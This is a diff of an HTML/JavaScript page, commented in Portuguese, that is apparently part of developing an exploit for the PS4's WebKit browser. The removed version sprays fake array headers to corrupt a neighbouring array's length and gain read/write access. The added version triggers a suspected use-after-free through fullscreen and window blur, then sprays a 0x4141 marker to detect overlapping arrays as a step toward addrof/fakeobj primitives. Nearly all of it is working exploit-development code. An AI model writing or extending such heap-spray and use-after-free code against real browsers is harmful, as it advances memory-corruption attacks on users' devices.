@@ -1,134 +1,112 @@
-
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 Webkit: Full-Stack Fuzzer (Size + Header)</title>
-<style>
-    body { background-color: #000; color: #fff; font-family: monospace; text-align: center; }
-    #status { font-size: 1.2em; margin: 20px; color: yellow; }
-    #log { text-align: left; margin: 20px auto; width: 90%; border: 1px solid #555; padding: 10px; height: 250px; overflow-y: auto; background: #111; }
-    .success { color: #fff; background: #0000aa; font-size: 1.5em; padding: 15px; display: block; border: 2px solid #fff;}
-    button { padding: 20px 40px; font-size: 1.3em; cursor: pointer; background: #d00; color: #fff; border: none; font-weight: bold; }
-</style>
+<title>PS4 UAF Overlap Test</title>
+
 </head>
 <body>
 
-<h1>FULL-STACK FUZZER v2.0</h1>
-<h2>(Size & Header Rotation)</h2>
-
-<div id="status">Aguardando início...</div>
-<button onclick="fire()">DISPARAR FUZZER</button>
-<div id="log">Logs do sistema...</div>
+<h1>Webkit UAF: Teste de Sobreposição</h1>
+<div class="status" id="msg">
+    INSTRUÇÕES:<br>
+    1. Clique em "INICIAR TESTE".<br>
+    2. Aperte "OPTIONS" (Menu Lateral).<br>
+    3. Observe se aparece "BINGO" na tela.<br>
+    4. Se não aparecer, clique em "Atualizar" no menu para verificar se ainda crasha.
+</div>
+<button onclick="fire()">INICIAR TESTE</button>
+<div id="log"></div>
 
 <script>
+    const Msg = document.getElementById('msg');
     const Log = document.getElementById('log');
-    function log(txt) { Log.innerHTML += ">> " + txt + "<br>"; Log.scrollTop = Log.scrollHeight;}
+    function log(txt) { Log.innerText += txt + "\n"; }
 
-    // === CONFIGURAÇÃO DO FUZZER ===
+    // O número mágico 0x4141414141414141 em ponto flutuante
+    const MAGIC_POISON = 2.121995791e-314; 
 
-    // 1. Lista de Cabeçalhos Falsos (Fake Headers)
-    // Tentam criar lengths gigantes (0x10000, 0x20000, etc) com diferentes flags
-    const CANDIDATE_HEADERS = [
-        1.3906717577229e-309, // 0x0001000000000010
-        2.7813435154458e-309, // 0x0002000000000010
-        1.3906717577225e-309, // 0x0001000000000000 (Sem flags)
-        6.953348767347e-310   // 0x0000000100000010 (Shifted)
-    ];
-
-    // 2. Lista de Tamanhos de Spray (Spray Sizes)
-    // O buraco tem tamanho 16. Precisamos de algo maior para transbordar.
-    // Testamos vários tamanhos para tentar acertar o alinhamento do próximo header.
-    const CANDIDATE_SIZES = [20, 24, 32, 40, 48, 64];
-
-    let victims = [];
-    let neighbors = [];
-    const COUNT = 8000; // Reduzido um pouco para aguentar a pressão
+    // Arrays para tentar criar a sobreposição
+    let controller_arrays = [];
+    let target_arrays = [];
+    const SPRAY_COUNT = 10000; // Quantidade de arrays
 
     function fire() {
-        document.getElementById('status').innerText = "Alocando Heap Feng Shui...";
-        log("[*] Criando padrão [Vizinho | Vítima]...");
-
+        Msg.innerText = "Preparando memória... Aguarde.";
+        
+        // --- FASE 1: PREPARAÇÃO DO HEAP ---
+        // Criamos muitos arrays. A ideia é que eles fiquem próximos na memória.
         try {
-            for(let i=0; i<COUNT; i++) {
-                let v = new Float64Array(16); // Vítima
-                victims.push(v);
-                
-                let n = new Float64Array(16); // Vizinho (Alvo)
-                n.fill(0); 
-                neighbors.push(n);
+            for(let i = 0; i < SPRAY_COUNT; i++) {
+                // Array "Controlador": Vamos usar este para tentar ler a memória alheia.
+                // Marcamos o primeiro elemento com o índice 'i' para identificar qual é qual.
+                let ctrl = new Float64Array(16);
+                ctrl[0] = i; 
+                controller_arrays.push(ctrl);
+
+                // Array "Alvo": Estes são os que esperamos que sejam liberados e sobrepostos.
+                let target = new Float64Array(16);
+                target.fill(1.1);
+                target_arrays.push(target);
             }
-        } catch(e) { log("Erro de memória: " + e); return; }
+        } catch(e) { log("Erro na preparação: " + e); }
+        
+        Msg.innerText = "Memória pronta. Aperte OPTIONS agora!";
 
-        log("[+] Heap pronto. Pressione OPTIONS para iniciar o ataque.");
-        document.getElementById('status').innerText = ">>> APERTE OPTIONS AGORA <<<";
-
+        // Solicita Fullscreen (necessário para o seu trigger original)
         const doc = document.documentElement;
         if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
         else if (doc.requestFullscreen) doc.requestFullscreen();
 
+        // --- FASE 2: O GATILHO E O SPRAY ---
         window.onblur = function() {
-            log("[!] Blur! Iniciando Fuzzing Rotativo...");
+            log("Blur detectado! Tentando causar sobreposição...");
+            document.body.style.background = "#550000"; // Feedback visual (vermelho)
 
-            // 1. FREE
-            victims = null;
+            // TENTATIVA DE LIBERAÇÃO (FREE)
+            // No seu script original, você usava 'victim = null'. 
+            // Aqui, tentamos liberar nossos arrays "alvo" para criar buracos na memória.
+            target_arrays = null; 
 
-            // 2. SPRAY FUZZING (A Mágica)
-            let spray = [];
-            const ROTATION_SPEED = 500; // Troca de tamanho a cada X sprays
-
+            // O SPRAY (VENENO)
+            // Tentamos preencher os buracos criados acima com o nosso número mágico.
+            // Se um buraco for preenchido exatamente onde um 'controller_array' estava
+            // esperando dados, o 'controller_array' passará a ler o veneno.
+            let overlap_spray = [];
             try {
-                // Spray agressivo (3x o tamanho original para garantir cobertura)
-                for(let i=0; i < COUNT * 3; i++) {
-                    
-                    // A. Escolhe o Tamanho (Rotação lenta)
-                    let size_idx = Math.floor(i / ROTATION_SPEED) % CANDIDATE_SIZES.length;
-                    let current_size = CANDIDATE_SIZES[size_idx];
-
-                    // B. Escolhe o Header (Rotação rápida)
-                    let header_idx = i % CANDIDATE_HEADERS.length;
-                    let current_header = CANDIDATE_HEADERS[header_idx];
-
-                    // Cria o array do tamanho escolhido
-                    let s = new Float64Array(current_size);
-                    // Enche com o header escolhido
-                    s.fill(current_header);
-                    
-                    spray.push(s);
+                // Usamos um tamanho ligeiramente diferente para tentar cair nos buracos certos
+                for(let i=0; i < SPRAY_COUNT * 2; i++) {
+                    let poison = new Float64Array(20); 
+                    poison.fill(MAGIC_POISON); // Preenche com 0x4141...
+                    overlap_spray.push(poison);
                 }
             } catch(e) {}
 
-            log("[*] Spray concluído. Verificando resultados...");
-            checkGodMode();
-        };
-    }
-
-    function checkGodMode() {
-        let success = false;
-        for(let i=0; i<COUNT; i++) {
-            // Se o tamanho do vizinho não for mais 16, VENCEMOS.
-            if(neighbors[i].length !== 16) {
-                success = true;
-                document.body.style.background = "#0000aa"; // Azulão
-                
-                let msg = "SUCESSO CRÍTICO! LENGTH CORROMPIDO!";
-                Log.innerHTML = `<div class="success">${msg}</div>` + Log.innerHTML;
-                
-                log("===================================");
-                log("[!!!] GOD MODE ATIVADO NO ÍNDICE " + i);
-                log("Tamanho original: 16");
-                log("NOVO TAMANHO: " + neighbors[i].length);
-                log("===================================");
-                log("Tire foto. Você tem leitura/escrita total.");
-                return; // Para tudo e celebra
+            // --- FASE 3: VERIFICAÇÃO (A busca pelo addrof/fakeobj) ---
+            log("Verificando por sobreposições...");
+            let found = false;
+            for(let i = 0; i < SPRAY_COUNT; i++) {
+                // Se o UAF funcionou antes do refresh, um dos nossos arrays controladores
+                // não terá mais o valor 'i' no índice 0. Ele terá o VENENO que sprayamos.
+                if (controller_arrays[i][0] === MAGIC_POISON) {
+                    found = true;
+                    document.body.style.background = "#005500"; // Verde!
+                    Msg.innerHTML = "<h1>BINGO! SOBREPOSIÇÃO DETECTADA!</h1>" +
+                                    "O array controlador [" + i + "] agora aponta para o spray.<br>" +
+                                    "Este é o primeiro passo para addrof/fakeobj!";
+                    log(">>> SUCESSO: Controller[" + i + "][0] == 0x4141414141414141 <<<");
+                    // Se chegamos aqui, temos uma primitiva de leitura/escrita estável.
+                    // O próximo passo (muito complexo) seria usar isso para vazar endereços.
+                    break;
+                }
             }
-        }
 
-        if(!success) {
-            log("[-] Falha: Nenhum tamanho foi alterado nesta tentativa.");
-            document.body.style.background = "#330000"; // Vermelho
-            document.getElementById('status').innerText = "Falha. Tente novamente.";
-        }
+            if (!found) {
+                 Msg.innerText = "Nenhuma sobreposição detectada enquanto a página estava viva.";
+                 log("Falha: Nenhum array controlador foi corrompido.");
+                 log("Agora, clique em ATUALIZAR no menu. Se crashar, é um Teardown UAF (difícil de explorar).");
+            }
+        };
     }
 </script>
 </body>
